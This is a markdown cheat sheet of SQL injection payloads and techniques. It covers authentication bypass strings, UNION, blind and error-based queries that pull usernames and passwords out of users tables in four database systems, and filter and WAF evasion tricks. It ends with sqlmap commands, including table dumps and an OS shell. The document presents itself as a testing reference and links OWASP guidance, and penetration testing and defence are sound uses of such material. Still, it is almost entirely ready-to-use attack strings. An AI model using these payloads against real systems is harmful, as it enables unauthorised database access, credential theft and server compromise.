# SQL Injection Hints & Cheat Sheet

Quick reference for SQL injection testing, payloads, and bypass techniques.

---

## Quick Payloads by Category

### Authentication Bypass

```sql
-- Basic OR bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
" OR "1"="1
" OR 1=1--

-- Admin bypass
admin'--
admin'/*
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'/*
' OR 1=1 LIMIT 1--
' OR 1=1 LIMIT 1#

-- Password field bypass
' OR '1'='1
anything' OR '1'='1
```

### Column Count Detection

```sql
-- ORDER BY method (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

-- UNION NULL method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- GROUP BY method
' GROUP BY 1--
' GROUP BY 1,2--
```

### UNION-Based Injection

```sql
-- Basic UNION
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
' UNION SELECT NULL,NULL,NULL--

-- With column identification
' UNION SELECT 'col1','col2',NULL--

-- Common extractions
' UNION SELECT version(),user(),database()--
' UNION SELECT @@version,NULL,NULL--
```

### Database Enumeration

#### MySQL

```sql
-- Database version
' UNION SELECT @@version,NULL--
' UNION SELECT version(),NULL--

-- Current user
' UNION SELECT user(),NULL--
' UNION SELECT current_user(),NULL--

-- Current database
' UNION SELECT database(),NULL--

-- All databases
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- All tables in database
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dbname'--

-- All columns in table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='tablename'--

-- Extract data
' UNION SELECT username,password FROM users--
' UNION SELECT CONCAT(username,':',password),NULL FROM users--
```

#### PostgreSQL

```sql
-- Version
' UNION SELECT version(),NULL--

-- Current user
' UNION SELECT current_user,NULL--

-- List databases
' UNION SELECT datname,NULL FROM pg_database--

-- List tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- List columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Microsoft SQL Server

```sql
-- Version
' UNION SELECT @@version,NULL--

-- Current user
' UNION SELECT user_name(),NULL--
' UNION SELECT SYSTEM_USER,NULL--

-- List databases
' UNION SELECT name,NULL FROM master..sysdatabases--

-- List tables
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- List columns
' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
```

#### Oracle

```sql
-- Version
' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--

-- Current user
' UNION SELECT user,NULL FROM dual--

-- List tables
' UNION SELECT table_name,NULL FROM all_tables--

-- List columns
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

### Blind SQL Injection

#### Boolean-Based

```sql
-- True condition
' AND 1=1--
' AND 'a'='a'--

-- False condition
' AND 1=2--
' AND 'a'='b'--

-- String extraction
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))=97--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- Length detection
' AND LENGTH(password)>10--
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=32--
```

#### Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND IF 1=1 WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)--
```

### Error-Based Injection

```sql
-- MySQL EXTRACTVALUE
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--

-- MySQL UPDATEXML
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--

-- MSSQL CONVERT
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--

-- PostgreSQL CAST
' AND 1=CAST(version() AS int)--
```

---

## Filter Bypass Techniques

### Comment Variations

```sql
-- Standard
--
#
/**/

-- MySQL specific
--+
-- -
#!

-- Oracle
--
```

### Space Bypass

```sql
-- Using comments
'/**/OR/**/1=1--
'/**/UNION/**/SELECT/**/1,2--

-- Using tabs
'%09OR%091=1--

-- Using newlines
'%0aOR%0a1=1--
'%0dOR%0d1=1--

-- Using parentheses
'OR(1=1)--
'UNION(SELECT(1),(2))--
```

### Keyword Bypass

```sql
-- Case variation
' uNiOn SeLeCt 1,2--
' UnIoN SeLeCt 1,2--

-- Double keywords (for filters that remove once)
' UNUNIONION SELSELECTECT 1,2--

-- URL encoding
' %55NION %53ELECT 1,2--

-- Unicode encoding
' %u0055NION %u0053ELECT 1,2--

-- Hex encoding
' /*!UNION*/ /*!SELECT*/ 1,2--
```

### Quote Bypass

```sql
-- Hex encoding strings
' UNION SELECT 0x61646d696e,0x70617373--  (admin,pass)

-- CHAR function
' UNION SELECT CHAR(97,100,109,105,110),CHAR(112,97,115,115)--

-- Concatenation
' UNION SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109)),NULL--
```

### WAF Bypass

```sql
-- HTTP Parameter Pollution
?id=1&id=' UNION SELECT 1,2--

-- Inline comments (MySQL)
/*!50000UNION*//*!50000SELECT*/1,2--

-- Null bytes
%00' UNION SELECT 1,2--

-- Overflow attacks
' UNION SELECT 1,2 AND 1=1 AND 1=1 AND 1=1--
```

---

## Quick Reference Tables

### Useful Functions by DBMS

| Function | MySQL | PostgreSQL | MSSQL | Oracle |
|----------|-------|------------|-------|--------|
| Version | `version()` | `version()` | `@@version` | `banner FROM v$version` |
| Current User | `user()` | `current_user` | `user_name()` | `user` |
| Current DB | `database()` | `current_database()` | `db_name()` | `SYS.DATABASE_NAME` |
| Concat | `CONCAT(a,b)` | `a||b` | `a+b` | `a||b` |
| Substring | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()` | `SUBSTR()` |
| String Length | `LENGTH()` | `LENGTH()` | `LEN()` | `LENGTH()` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY` | `DBMS_PIPE` |

### Comment Syntax

| DBMS | Single Line | Multi Line | Inline |
|------|-------------|------------|--------|
| MySQL | `--` `#` | `/* */` | `/*! */` |
| PostgreSQL | `--` | `/* */` | - |
| MSSQL | `--` | `/* */` | - |
| Oracle | `--` | `/* */` | - |

---

## Common Mistakes to Avoid

1. **Forgetting the trailing space after `--`**
   - Wrong: `'--`
   - Right: `'-- ` or `'--+`

2. **Not URL-encoding special characters**
   - Encode `#` as `%23`
   - Encode space as `%20` or `+`

3. **Wrong quote type for the context**
   - Test both single and double quotes
   - Check for numeric injection (no quotes needed)

4. **Forgetting database-specific syntax**
   - MySQL uses backticks for identifiers
   - MSSQL uses square brackets
   - PostgreSQL is case-sensitive

5. **Not accounting for existing WHERE conditions**
   - Use `' OR 1=1--` not just `OR 1=1`

---

## Troubleshooting Guide

| Problem | Possible Cause | Solution |
|---------|---------------|----------|
| No error displayed | Error messages suppressed | Try blind techniques |
| Syntax error | Wrong comment or quote | Try different terminators |
| No data returned | Wrong column count | Recount with ORDER BY |
| Empty result | Column type mismatch | Use NULL in UNION |
| WAF blocking | Signature detected | Try bypass techniques |
| Query timeout | Slow extraction | Reduce SLEEP time |

---

## Sqlmap Quick Reference

```bash
# Basic scan
sqlmap -u "http://target/page?id=1"

# With cookies
sqlmap -u "http://target/page?id=1" --cookie="session=abc"

# POST data
sqlmap -u "http://target/login" --data="user=a&pass=b"

# Specific parameter
sqlmap -u "http://target/page?id=1&name=test" -p id

# Enumerate databases
sqlmap -u "http://target/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target/page?id=1" -D dbname --tables

# Dump table
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# OS shell
sqlmap -u "http://target/page?id=1" --os-shell

# Increase level and risk for thorough testing
sqlmap -u "http://target/page?id=1" --level=5 --risk=3

# Bypass WAF
sqlmap -u "http://target/page?id=1" --tamper=space2comment
```

---

## OWASP References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP Injection Flaws](https://owasp.org/www-community/Injection_Flaws)

## Additional Resources

- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PentestMonkey SQL Injection Cheat Sheets](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
